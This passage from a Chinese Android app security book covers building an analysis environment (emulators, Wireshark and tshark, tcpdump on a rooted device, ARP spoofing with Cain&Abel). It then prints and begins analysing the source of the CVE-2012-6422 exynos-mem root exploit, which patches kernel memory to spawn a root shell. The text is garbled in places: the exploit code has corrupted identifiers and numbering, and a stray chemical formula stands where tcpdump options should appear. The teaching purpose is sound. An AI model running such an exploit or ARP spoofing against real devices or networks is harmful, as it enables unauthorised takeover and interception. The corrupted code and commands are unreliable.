如图2-6所示，根据不同环境，从http://www.eclipse.org/downloads/的Eclipse IDE for Java EE Developers下载32位或64位Eclipse。

 </div>

 </div>

Eclipse不需要安装，把下载的文件解压到适当位置即可运行。为方便起见，本书解压到了C:\Eclipse目录。接下来设置Android平台开发环境。

 </div>

为了构建Eclipse的Android开发环境，选择Help > Install New Software菜单，如图2-9所示。

 </div>

然后在Work with栏输入https://dl-ssl.google.com/android/eclipse，点击Add即可安装相关开发工具。最新版的Eclipse默认包含相关目录，只需选择即可安装。

 </div>

全选搜索到的开发工具后，接受授权并开始安装。

 </div>

 </div>

重启Eclipse后，如果Window菜单下出现Android SDK Manager、AVD Manager等菜单，就表示安装成功。

 </div>

最后，将SDK安装目录下的sdk\platform-tools添加到Path系统环境变量，使相关工具在任何路径都可以使用SDK。依次选择Windows 7系统的控制面板>系统>高级>环境变量，在Path变量中添加相关路径。

 </div>

#### ☑ 利用谷歌Android Studio轻松构建开发环境

谷歌将Android Studio指定为官方开发工具, 该工具的诊断速度比后面将要介绍的Eclipse环境更慢, 这是其劣势所在。但是, 谷歌今后将集中改善此款工具, 所以有必要关注并熟悉Android Studio。访问Android SDK下载页面后, 可以看到如下所示的Android Studio下载页面。根据步骤提示安装文件后, 即可开始使用。

http://developer.android.com/sdk/index.html

如想学习关于环境安装的最新综合信息，请参考我在安全防范项目讲课时发布的http://goo.gl/nA25zY文档。

 </div>

 </div>

在Android环境中进行诊断有一点便利之处，即无需获取ROOT权限也可以把apk文件安装到模拟器，而且可以方便地分析数据包和进行动态分析。如果安装Android SDK的同时安装了platform-tools，则C:\Users\用户名\AppData\Local\Android\android-sdk或C:\Programe files\Android下的目录会如图2-17所示。

 </div>

可以直接运行 “AVD Manager.exe” 和 “SDK Manager.exe” 文件，如图2-17所示。也可以运行Eclipse后，通过菜单Java > Windows运行，如图2-18所示。

 </div>

运行图2-18的③ Android Virtual Device Manager后，出现如图2-19所示界面。可以添加新的模拟器，也可以修改已有模拟器的属性。

 </div>

点击New可以添加新的模拟器。此处需要注意，API 10以上开始支持 “Intel Atom x86” 环境。这会提供Windows环境中运行模拟器时的最佳环境，比之前的环境提高2倍~3倍的速度。

#### O☉ Intel Atom相关术语

Intel Atom是支持Intel x86和x86-64的CPU。2008年首次面世，使用45nm CMOS工程设计，针对超便携移动个人电脑（Ultra-Mobile PC）、智能手机等低电量随身设备。

出处：http://ko.wikipedia.org/wiki/%EC%9D%B8%ED%85%94_%EC%95%84%ED%86%B0

 </div>

如需使用Atom x86环境，就需要在安装Android SDK时选择安装extra内的Intel x86 Emulator Accelerator(HAXM)。如果以之前的arm环境为基础运行Android模拟器，那么极低的性能将影响分析，只运行模拟器也会很慢。

不过，现在的模拟器提高了性能，解决了分析时的困难。Intel HAXM可以提高性能，虽然只支持API 10、15、16、17而不支持Google API，但对分析恶意代码没有太大影响。

 </div>

虽然大家因为没有Android系统手机或是为了安全起见（分析恶意代码等）而使用模拟器，但分析应用程序服务漏洞时，如果文件容量大或功能多，就会影响运行速度，带来很多不便。此时也可以在实际设备中进行诊断，所以建议各位使用实际的移动设备。

##### ☑ 如果在InterAtom环境中运行模拟器时出现错误

http://software.intel.com/en-us/android/articles/intel-hardware-accelerated-execution-manager

设置为Intel Atom x86环境后，安装HAXM时会出现如图2-22所示的错误，模拟器会终

运行。此时需要安装管理员程序以支持虚拟环境技术（VT）。

 </div>

 </div>

 </div>

安装完成后，重启AVDM并运行模拟器，就会得到如图2-25所示的正常结果

生成AVD文件后，保存到C:\Users\用户名.android\avd文件夹，可以将该AVD文件复制到其他地方进行练习。该文件在Windows以外的操作系统中的路径如下。

Linux环境：/home/用户名/.android

□ MAC OS环境：/Users/用户名

 </div>

avd文件夹中的sdcard.img是Android磁盘镜像文件。

 </div>

#### 2.1.3 测试Android开发环境

为了查看Android开发环境是否正常运行，先尝试生成样本应用程序。选择Eclipse菜单中的File > New > Other > Android > Android Sample Project。本书使用的是Android 4.2.2版本。各位可以自己选择用于测试的应用程序，此处选择创建第一个样本。

 </div>

点击菜单Run > Debug可以查看应用程序创建过程。检查编译前后的目录结构可以发现，并无太大差别，只是res文件夹多了apk文件和dex文件。

[2013-03-29 12:10:24 - AccelerometerPlay] New emulator found: emulator-5554
[2013-03-29 12:10:24 - AccelerometerPlay] Waiting for HOME
('android.process.acore') to be launched...
[2013-03-29 12:10:54 - AccelerometerPlay] emulator-5554 disconnected!
Cancelling

'com.example.android.accelerometerplay.AccelerometerPlayActivity activity launch'!

[2013-03-29 12:16:08 - AccelerometerPlay]

[2013-03-29 12:16:08 - AccelerometerPlay] Android Launch!

[2013-03-29 12:16:08 - AccelerometerPlay] adb is running normally.

[2013-03-29 12:16:08 - AccelerometerPlay] Performing

com.example.android.accelerometerplay.AccelerometerPlayActivity activity launch

[2013-03-29 12:16:08 - AccelerometerPlay] Automatic Target Mode: using

existing emulator 'emulator-5554' running compatible AVD '4_2_Test'

[2013-03-29 12:16:08 - AccelerometerPlay] Uploading AccelerometerPlay.apk onto device 'emulator-5554'

[2013-03-29 12:16:09 - AccelerometerPlay] Installing

AccelerometerPlay.apk...

[2013-03-29 12:16:15 - AccelerometerPlay] Success!

[2013-03-29 12:16:16 - AccelerometerPlay] Starting activity

com.example.android.accelerometerplay.AccelerometerPlayActivity on device emulator-5554

[2013-03-29 12:16:19 - AccelerometerPlay] ActivityManager: Starting: Intent { act=android.intent.action.MAIN cat=

[android.intent.category.LAUNCHER]

cmp=com.example.android.accelerometerplay/.AccelerometerPlayActivity }

[2013-03-29 12:35:06 - AccelerometerPlay]

[2013-03-29 12:35:06 - AccelerometerPlay] Android Launch!

[2013-03-29 12:35:06 - AccelerometerPlay] adb is running normally.

 </div>

开始运行后，可以通过底部的LogCat信息和控制台（Console）查看发生错误的部分。如果

运行了不支持当前API版本的AVD，就会导致个别功能受限。

[2013-03-29 12:10:23 - Emulator] could not get wglGetExtensionsStringARB

如果在Android应用程序模拟器（AVD）上成功运行，则会看到如图2-30所示的画面。

 </div>

#### ☑ 设置调试模式以在实际设备中进行测试

本书大部分测试都会在虚拟终端进行。特别是在分析恶意代码时，为了避免实际设备受到感染，必须使用虚拟终端。如果想使用实际设备，则须开启USB调试模式。每个Android版本中的位置略有不同，但是进入设置>开发人员选项>USB调试后，编译应用程序时可以直接在设备中查看。

 </div>

Android 4.2.2及以上版本为了防止用户访问开发人员选项，Android开发人员隐藏了此菜单。在设置》更多…》设备信息中双击编译版本即可进入开发人员模式（每个步骤出现的提示语句都很有意思）。

 </div>

如果设备画面被锁（Lock），那么即使设置调试模式后连接到PC，也不能进行分析。连接到PC后，解除锁定才能识别设备并开始调试。

 </div>

#### 2.1.4 Linux系统Android开发环境构建

本书以Windows和Mac两大环境（部分工具是Mac软件）为基础进行说明。Android开发工具（ADK）也可以在Ubuntu Linux正常运行，所以首先简单了解Linux开发环境的构建方法。也可以使用以后要介绍的“ARE”（Android Reverse Engineering）代替Linux环境。

安装ADK之前升级Ubuntu Linux程序目录，如图2-34所示。

 </div>

如果没有安装JDK，就输入如下命令安装openjdk，如图2-35所示。软件名输入openjdk-版本信息jak，虽然也可以安装版本6，但是推荐各位安装最新版本。

 </div>

本书已下载ADK集成工具包，如图2-36所示。解压后访问相应文件夹，输入命令升级API，如图2-37所示。

 </div>

解压下载后的文件，运行命令/home/boanproject/adt-bundle-linux-x86/sdk/tools#./android即可启动“Android SDK Manager”。之后的操作与Windows版本相同，不再赘述。

 </div>

### 2.2 构建数据包分析及检测环境

要想查看移动应用程序与服务（服务器）之间的通信数据包，必须在同一网络中进行。通常使用无线AP路由器，但要根据实际环境做出相应调整，有时会禁止安装无线AP或关闭USB端口（禁用移动媒介）。（虽然诊断时可以要求解除限制，但通常会对外部人员采取较强的安全策略。）

另一个收集/分析网络信息的方法是使用点对点（Ad-Hoc）模式。可以使用USB类型的无线AP，也可以使用移动设备直接截获数据包信息进行分析。下面分别了解各个环境。

#### 2.2.1 使用无线路由器收集信息

无论是HUB模式还是Swich模式，只要用于诊断的PC和移动设备连接在同一个无线AP上，路由器就可以收集到数据包信息。

HUB模式不需要任何设置就可以向所有设备发送数据包，所以用Wireshark监听即可。但是Swich模式需要指定要收集的移动设备和网关，然后PC才能收集到信息。本书使用Spoofing攻击原理。

Spoofing攻击时使用的工具是Cain&Able。这款工具可以截取同一网络内所有用户的明文通信。使用此款工具时，尽量不要使用所有职员都在使用的无线AP进行诊断。一定要通过其他无线AP连接PC和移动设备，然后再进行诊断。

安装并运行Cain&Able，右键点击Sniffer标签，选择“Scan MAC Address”。为了搜索所有网段内的IP，查看是否指定192.168.1.1~192.168.1.254（不同环境的IP地址均不同），然后点击OK按钮。

 </div>

如图2-39所示，点击画面上方的快捷菜单 “+”，选择ARP攻击对象。在左边选择网关地址（192.168.1.1），在右边选择需要收集的对象数据包信息。如果连接有多个设备，也可以多选。

 </div>

点击 “OK” 后自动进行ARP Spoofing攻击，同时可以查看数据包交换过程。大家了解到这种程度就可以了。我们还能利用此工具进行网络攻击，但这部分内容与本书无关，故省略。

 </div>

接着使用WireShark查看网络信息。WireShark是开源网络数据包分析程序，可用于检查网络问题、分析并开发与软件的通信协议等。该程序最初发布时的名称是Ethereal，但2006年5月因注册商标问题改为现在的WireShark。

WireShark可以在Windows、UNIX、Linux等所有操作系统上运行，也普及到了 Backtrack(Kali Linux)等所有Live CD。安装WireShark时，可用于控制台模式的命令行版本Tshark也会一同安装，Tshark也包含了WireShark的所有功能。图2-41显示了可下载的各版本WireShark。

http://www.wireshark.org/download.html

 </div>

WireShark可以分析本地电脑和服务器之间、服务器和服务器之间等所有网络环境中的数据包，又因为可以把数据包信息转换成数据进行查看，所以经常用于网络取证、恶意代码分析等领域。WireShark的功能十分强大，想深入学习的读者可以参考Wireshark Network Analysis (Chappell, Laura/ Combs, Gerald (FRW), Laura Chappell University, 2012) 一书。

运行WireShark后，点击菜单Capture > Interface。选择诊断PC使用的网络接口后，点击Start按钮。这样就可以在PC上查看移动设备上的所有网络通信内容。如果无线路由器是HUB模式，则可以省略之前的Spoofing攻击，直接用WireShark浏览网络数据包信息。

 </div>

 </div>

先看看WireShark的Capture菜单。

   </div>

 </div>

Capture菜单包含了接口罗列、显示及截取新的数据包、停止正在运行的截取功能、重新截取、查看过滤内容等功能。可以使用主菜单工具栏（Main Toolbar）快速运行Capture菜单。

下面罗列WireShark识别的网络接口。点击Capture > Interface可以看到接口信息对话框，如图2-45所示。UNIX或Linux系统虽然会有少许差异，但功能相同。如果未显示网络接口，WireShark就不能截取有线或无线网络数据。

 </div>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>项目</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Description</td><td style='text-align: center; word-wrap: break-word;'>显示操作系统提供的网络接口或Edit&gt;Preferences中设置的网络接口信息</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>IP</td><td style='text-align: center; word-wrap: break-word;'>显示分配给相应网络接口的IP地址。若未分配IP地址，则显示“none”</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Packets</td><td style='text-align: center; word-wrap: break-word;'>显示接口信息对话框打开后在相应接口截获的数据包数量。如果没有截获的数据包，则显示灰色</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Packets/s</td><td style='text-align: center; word-wrap: break-word;'>显示对话框关闭之前截获的数据包数量</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Start</td><td style='text-align: center; word-wrap: break-word;'>根据选项中设置的条件截取数据包，或者以默认设置立即开始在所选接口截取数据包</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Stop</td><td style='text-align: center; word-wrap: break-word;'>停止正在运行的数据包截获功能</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Details (Windows专用)</td><td style='text-align: center; word-wrap: break-word;'>显示接口详细信息对话框</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>Option</td><td style='text-align: center; word-wrap: break-word;'>显示所选接口的数据包截取选项设置对话框</td></tr></table>

##### ☐ 使用 Tshark 在控制台环境进行诊断

Tshark是网络协议分析工具，用户可以利用它在实时网络中截取数据包，或读取之前保存的截取文件的数据包，并以解码形式输出到屏幕，或用文件形式创建数据包。默认的Tshark文件格式是libpcap。

可以将Tshark视为WireShark在CLI环境中的实现。WireShark截获数据包并对数据包解码时，会产生大量系统开销，所以WireShark截获几百兆或更多数据包时，经常会停止运行。但是Tshak不受文件大小限制，能够显示所有内容，也能直接使用WireShark过滤语句。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>主要选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-i &lt;interface&gt;</td><td style='text-align: center; word-wrap: break-word;'>网络接口，名称或IDX（def: First Non-Loopback）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-f &lt;capture filter&gt;</td><td style='text-align: center; word-wrap: break-word;'>使用libpcap过滤语句过滤数据包</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-s &lt;snaplen&gt;</td><td style='text-align: center; word-wrap: break-word;'>设置数据包快照长度（def: 65535）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-p</td><td style='text-align: center; word-wrap: break-word;'>不使用Promiscuous模式截取</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-1</td><td style='text-align: center; word-wrap: break-word;'>可用时，使用Monitor模式截取</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-B &lt;buffer size&gt;</td><td style='text-align: center; word-wrap: break-word;'>设置内核缓冲大小（def: 1MB）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-y &lt;link type&gt;</td><td style='text-align: center; word-wrap: break-word;'>设置链路层类型（def: First appropriate）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-D</td><td style='text-align: center; word-wrap: break-word;'>显示接口列表后关闭</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-L</td><td style='text-align: center; word-wrap: break-word;'>显示接口链路层类型后关闭</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-c &lt;packet count&gt;</td><td style='text-align: center; word-wrap: break-word;'>截取N个数据包后停止（def: infinite）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-a &lt;autostop cond.&gt;</td><td style='text-align: center; word-wrap: break-word;'>· duration：截取NUM-NUM秒（指定的时间）秒后停止· filesize：截取NUM-NUM KB（指定的大小）后停止· files：创建NUM-NUM个文件后停止</td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>文件主要选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-b &lt;ringbuffer.opt.&gt;</td><td style='text-align: center; word-wrap: break-word;'>· duration：截取NUM-N秒（指定的时间）后转到下一个文件· filesize：截取NUM-N KB（指定的大小）后转到下一个文件· files：截取NUM-ringbuffer: N个文件后替换· -r &lt;infile&gt;</td><td style='text-align: center; word-wrap: break-word;'>设置调用的文件名</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-w &lt;outfile&gt;</td><td style='text-align: center; word-wrap: break-word;'>以pcap文件格式保存数据包</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-C &lt;config profile&gt;</td><td style='text-align: center; word-wrap: break-word;'>以指定的设置文件（Configuration Profile）启动</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-F &lt;output file type&gt;</td><td style='text-align: center; word-wrap: break-word;'>设置输出文件格式（默认：libpcap）-F选项罗列文件格式</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-V</td><td style='text-align: center; word-wrap: break-word;'>显示数据包结构（数据包细节）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-O &lt;protocol&gt;</td><td style='text-align: center; word-wrap: break-word;'>显示数据包的协议信息（用逗号区分）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-S</td><td style='text-align: center; word-wrap: break-word;'>保存为文件时也显示数据包</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-X</td><td style='text-align: center; word-wrap: break-word;'>以HEX/ASCII格式显示数据包内容</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-T pdm1|ps|psml|text|fields</td><td style='text-align: center; word-wrap: break-word;'>设置文本输出格式（默认：text）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-u s|hms</td><td style='text-align: center; word-wrap: break-word;'>设置秒（Seconds）输出格式（默认：s: seconds）</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-X &lt;key&gt;: &lt;value&gt;</td><td style='text-align: center; word-wrap: break-word;'>扩展选项，详细内容请参考man文档</td><td style='text-align: center; word-wrap: break-word;'></td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-z &lt;statistics&gt;</td><td style='text-align: center; word-wrap: break-word;'>显示多项统计信息，详细内容请参考man文档</td><td style='text-align: center; word-wrap: break-word;'></td></tr></table>

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>运行主要选项</td><td style='text-align: center; word-wrap: break-word;'>说明</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-R &lt;read filter&gt;</td><td style='text-align: center; word-wrap: break-word;'>使用WireShark显示过滤语句对数据包进行过滤</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-n</td><td style='text-align: center; word-wrap: break-word;'>禁用所有Name Resolutions（def: 激活）</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-N &lt;name resolve flags&gt;</td><td style='text-align: center; word-wrap: break-word;'>使用特定Name Resolution(s): “mntC”</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>-d &lt;layer_type&gt;=&lt;&lt;selector&gt;,&lt;decode_as_protocol&gt;</td><td style='text-align: center; word-wrap: break-word;'>Decode方式设置示例：tcp.port=8888, htt</td></tr></table>

使用工具时，需要在CLI和GUI环境中选择。如果只执行一两个任务，那么选择有用户界面的GUI环境会比较方便；但是，在大量信息中与其他命令混用以收集数据或自动搜索日志文件时，CLI环境会方便很多。不能使用WireShark实时查看信息时，使用Tshark会比较方便。

#### 2.2.2 利用支持USB类型的AP（支持网关）收集信息

与iPhone不同, Android手机上的点对点模式功能会受到一定限制: 只能在一般无线网络中(无线AP)连接, 或连接静态(Static)设置的点对点模式。因此, 要使用USB类型的AP或一般无线AP, 也可以在本地安装数据包截取应用程序以直接收集数据包。

可以先获取终端的ROOT权限，然后设置为“允许使用点对点模式”。但每个设备的设置方法不同，稍有差错，设备就会变成“砖头”，所以本书会介绍第二种方法。USB类型的无线路由器产品一般会使用“Wevo AIR”和“Windy31 Gateway”。“Wevo AIR”的价格比较便宜，但是信号很弱，只能放在用于诊断的PC旁进行分析。使用通用AP设备时，可以像平常一样安装并使用。

还可以使用直接在诊断PC安装无线AP以进行诊断的网关型Windy31。产品缺货时，可以购买其他网关型设备。

 </div>

在网络适配器上选择要用作网关的接口，如图2-47所示。最好选择用户少、没有多大数据量的AP，因为太多不必要的数据会阻碍正常检测。

 </div>

 </div>

如果设备正常连接到AP，诊断PC就可以截取到设备之间传输的数据包，如图2-49所示。如果使用多个设备，可以在滤波器（Filter）中输入“ip.addr==设备IP信息”查看。

 </div>

#### 2.2.3 设置点对点网络以收集信息

组建PC间的无线网络时会使用点对点网络（Ad-hoc）。查看无线网络信号时，如果看到的不是无线AP，而是笔记本电脑上的AP标志，则说明正在使用点对点网络。

如前所示，因为Android设备的点对点网络连接很不稳定，所以我会使用无线AP（USB型）。但是，有些设备或环境下需要使用点对点网络，下面对其进行简单介绍。

##### ☐ 点对点网络定义

点对点网络不需要AP（Access Point，接入点），各终端之间可以使用分散的无线信号通信，是一个自组织的网络结构。此结构不存在可以在中间进行控制的节点，所以每个节点需要尽量多地使用自己拥有的信息在网络中进行通信，远距离通信需要经过其他节点传递。因此，需要使用可减少通信成本（hop数量、电力等）的计算路径的路由功能。

点对点网络会通过各节点的通信形成拓扑，所以能克服无线网络通信存在的距离上的限制。与使用固定路由的方式（静态方式）相比，各节点之间的移动比较自由，其特点就在于可动态变换网络拓扑。

最初的点对点网络称为“Packet Radio”，1970年初由DARPA（Defense Advanced Research Projects Agency，美国国防高级研究计划署）开发，BBN Technologies和SRI International设计、开发并测试了其初期系统。

出处：维基百科

下面通过Windows 7环境进行讲解。如图2-50所示，依次选择网络和共享中心➢更改适配器

设置 > 本地连接，然后在弹出的窗口中选择共享标签，之后选择上面的2个选项并选择无线网络连接（图2-51）。

 </div>

 </div>

如果本地连接图标显示 “已共享” 信息，则说明设置成功。

 </div>

在图2-53左侧菜单中选择管理无线网络，然后如图2-54所示，选择添加>创建点对点网络。

 </div>

 </div>

输入账号和密码。可能会有其他人尝试连接，建议使用比较复杂的密码。

 </div>

在无线网络列表中看到自己设置的点对点网络信息则说明设置成功，之后使用移动终端的Wi-Fi设置连接此AP即可，如果能正常访问网络则说明连接成功。

 </div>

#### 2.2.4 使用tcpdump二进制文件收集信息

下面使用UNIX系统常用的tcpdump转储Android设备的数据包。使用tcpdump必须满足下列条件。

☐ 必须使用USB连接Android设备与计算机。

☐ Android设备必须已获得ROOT权限。

☐ 本地电脑必须已安装ADB。

☐ 必须具备可在Android系统运行的tcpdump二进制文件。

假设已经获得Android系统的ROOT权限。使用USB连接Android设备和计算机后，利用ADB实用工具检测Android设备是否正常连接。检测方法是，使用ADB命令adb devices显示连接后的Android设备信息。(2.4节将详细介绍ADB相关信息，各位也可以提前阅读。)

 </div>

如果使用adb devices也看不到设备信息，就使用adb kill-server命令停止adb服务。然后进入Android设备的环境设置>开发人员选项>USB调试，输入adb devices命令就能看到Android设备信息。

 </div>

使用ADB把之前下载好的tcpdump二进制文件复制到Android设备。测试过多个位置后发现，在/system/xbin文件夹的运行最稳定。

 </div>

使用adb root转换成root权限后，运行adb shell命令启动Android设备的远程shell。之后移动到保存tcpdump文件的目录。

 </div>

将tcpdump的使用权限（Permission）设置为“拥有者可读、写、执行”。

 </div>

tcpdump可使用的选项如下。

 $ \text{H}_{2}\text{O} $

 </div>

转储数据包前，需要先查看Android设备网络接口信息。使用netcfg命令可以查看当前Android设备的网络接口信息。

 </div>

Wi-Fi环境下的网络接口信息会显示为Wlan0。输入如下命令收集数据包信息。

root@android:/#tcpdump -i wlan0 -w /sdcard/test.pcap -s -0

下面正式利用tcpdump二进制文件转储Android设备的数据包。我使用如下选项转储数据包。

1

 </div>

上图表示数据包转储状态，可以按Ctrl+C键终止。

我把转储的数据包保存到了一般用户可以找到的/sdcard文件夹，可以使用USB连接电脑并移动到此目录下找到文件。如果没有创建/sdcard文件夹，则可使用如下命令复制。

 </div>

可以使用WireShark在GUI环境中分析截获的文件，如图2-66所示。

 </div>

### 2.3 切换设备平台

为了得到Android设备的最高用户权限, 需要进行Rooting操作(获取Root权限), 即切换平台。用户切换平台是为了更自由地修改系统, 还有很多人是为了使用从黑市（Black Market）非法获取的付费内容。

切换平台后，访问黑市或黑客制作的假页面时，感染恶意代码的几率会更大，这是一种不太安全的操作。但是，为了诊断移动应用程序，必须先通过Rooting切换平台，这样才能方便诊断人员执行之后的操作。本书会介绍几种获取Root权限的方法。

Root权限获取方法会根据设备或版本的不同而有所不同，所以本节介绍的方法仅供参考，详细方法请访问Android用户论坛。

#### 2.3.1 通过攻击代码了解Rooting

“切换平台”又称“Rooting”。学习利用工具获取root权限之前，先了解一下获取root的原理。这部分内容较难，要求各位具备Linux系统和源代码的基础知识。如果理解比较困难，可以浏览后进入后续章节，通过之后的学习慢慢了解。

Rooting指的是获取系统最高权限，即root权限的行为。用户新购买的搭载Android系统的移动设备上的权限（guest权限）是shell，shell只能运行几种默认功能。

用户获取root权限是为了按照自己的意愿修改系统和系统主题、删除不必要的装机软件。

Rooting方法有很多种，可以利用零日攻击（0-day，尚未公开而可能被恶意利用的漏洞）运行ShellCode以获取root权限；还可通过利用零日攻击的DBD（drive-by-download，路过式下载）攻击，向Android系统插入su二进制文件以获取root权限；或者可以利用移动设备的“恢复出厂设置”（Recovery）模式插入特定二进制文件，从而获取root权限。

此处介绍的方法已在2012年末公开，但仍很常用。如果设备没有升级到最新固件，就能看到实际的攻击过程。下面就通过对Galaxy S3 exynos-mem手机的零日攻击——CVE-2012-6422 Exploit的分析，了解获取root权限的基本原理。

CVE-2012-6422是xda的用户alephzain开发的，源代码如下所示。 $ ^{①} $

1/*
2* exynos-mem device abuse by alephzain
3*
4* /dev/exynos-mem is present on GS3/GS2/GN2/MEIZU MX
5*
6* the device is R/W by all users :
7* crw-rw-rw- 1 system graphics 1, 14 Dec 13 20:24 /dev/exynos-mem
8*
9*/
10
11/*
12* Abuse it for root shell
13*/
14 #include <stdio.h>
15 #include <sys mman.h="">
16 #include <sys types.h="">
17 #include <sys stat.h="">
18 #include <fcntl.h>
19 #include <stdlib.h>
20 #include <unistd.h>
21 #include <errno.h>
22 #include <sys ioctl.h="">
23 #include <stdbool.h>
24
25 #define PAGE_OFFSET 0xC0000000
26 #define PHYS_OFFSET 0x40000000
27
28 int main(int argc, char **argv, char **env) {
29 int fd, i, m, index, result;
30
31 unsigned long *paddr = NULL;
32 unsigned long *tmp = NULL;
33 unsigned long *restore_ptr_fmt = NULL;
34 unsigned long *restore_ptr_setresid = NULL;

unsigned long addr_sym;
int page_size = sysconf(_SC_PAGE_SIZE);
int length = page_size * page_size;
/* for root shell */
char *cmd[2];
cmd[0] = "/system/xbin/su";
cmd[1] = NULL;
/* /proc/kallsyms parsing */
FILE *kallsyms = NULL;
char line [512];
char *ptr;
char *str;
bool found = false;
/* open the door */
fd = open("/dev/exynos-mem", O_RDLWR);
if (fd == -1) {
    printf("![] Error opening /dev/exynos-mem\n");
    exit(1);
}
/* kernel reside at the start of physical memory, so take some Mb */
paddr = (unsigned long *)mmap(NULL, length, PR62OT_READ|PROT_WRITE, MAP_SHARED, fd, PHYS_OFFSET);
tmp = paddr;
if (paddr == MAP_FAILED) {
    printf("![] Error mmap: %s|%08X\n", strerror(errno), i);
    exit(1);
}
/* search the format string "%pK %c %s\n" in memory
* and replace "%pK" by "%p" to force display kernel
* symbols pointer
*/
for(m = 0; m < length; m += 4) {
    if(*(unsigned long *)tmp == 0x204b7025 && *(unsigned long *)t76mp+1) == 0x25206325 && *(unsigned long *)tmp+2) == 0x00000a73) {
        printf("[*] s_show->seq_printf format string found at: 0x87808X\n", PAGE_OFFSET + m);
        restore_ptr_fmt = tmp;
        *(unsigned long*)tmp = 0x20207025;
        found = true;
        break;
    }
    tmp++;
}
if (found == false) {

88 printf("[!] s_show->seq_printf format string not found\\n");
89 exit(1);
90 }
91
92 found = false;
93
94 /* kallsyms now display symbols address */
95 kallsyms = fopen("/proc/kallsyms", "r");
96 if (kallsyms == NULL) {
97     printf("[!] kallsyms error: %s\\n", strerror(errno));
98     exit(1);
99 }
100
101 /* parse /proc/kallsyms to find sys_setresuid address */
102 while((ptr = fgets(line, 512, kallsyms)) {
103     str = strtok(ptr, " ");
104     addr_sym = strtoul(str, NULL, 16);
105     index = 1;
106     while(str) {
107         str = strtok(NULL, " ");
108     index++;
109     if (index == 3) {
110         if (strncmp("sys_setresuid\\n", str, 14) == 0) {
111             printf("[*] sys_setresuid found at 0x811208X\\n", addr_sym);
112             found = true;
113         }
114         break;
115     }
116     }
117     }
118     if (found) {
119         tmp = paddr;
120         tmp += (addr_sym - PAGE_OFFSET) >> 2;
121         for(m = 0; m < 128; m += 4) {
122             if (*(unsigned long *)tmp == 0xe3500000) {
123                printf("[*] patching sys_setresuid at 0x812408X\\n", addr_sym + m);
124                restore_ptr_setresuid = tmp;
125                *(unsigned long *)tmp = 0xe3500001;
126                break;
127         }
128         tmp++;
129         }
130         break;
131         }
132         }
133         }
134         fclose(kallsyms);
135         }
136         /* to be sure memory is updated */
137         usleep(100000);
138         }
139         /* ask for root */
140         result = setresuid(0, 0, 0);
141         /* restore memory */

144 * (unsigned long *)restore_ptr_fmt = 0x204b7025;
145 * (unsigned long *)restore_ptr_setresuid = 0xe3500000;
146 munmap(paddr, length);
147 close(fd);
148

149 if (result) {
150     printf("[!] set user root failed: %s\\n", strerror(errno));
151     exit(1);
152 }
153

154 /* execute a root shell */
execve (cmd[0], cmd, env);
return 0;
}

源代码的第6行~第7行是crw-rw-rw- 1 system graphics 1, 14 Dec 13 20:24 /dev/exynos-mem, 这是/dev/exynos-mem驱动程序的属性。所有用户都有读写权限，如图2-67所示。

 </div>

Linux的/dev目录是保存设备文件的地方, 用户程序通过这些设备文件访问系统硬件。因为属性是crw-rw-rw-，所以所有用户都可以访问内核区域。

CVE-2012-6422漏洞是因为所有用户均可通过/dev/exynos-mem访问物理内存而产生的。下面逐行分析攻击代码。

为了映射可读写设备文件和内存地址，第25行~第26行声明了PAGE_OFFSET地址和大小。

#define PAGE_OFFSET 0xC0000000
#define PHYS_OFFSET 0x40000000

32位系统的内存区分方式如下。

 </div>

   </div>

0xc0000000~0xfffffff区域是内存使用的区域，大小是1G（=0x40000000）。

第29行~第35行声明并初始化变量，以保存内核内存地址、用于备份的地址、用于备份的uid、符号地址等。

第37行~第38行使用sysconf(_SC_PAGE_SIZE)输入系统内存的页大小。一般page_size是4096。

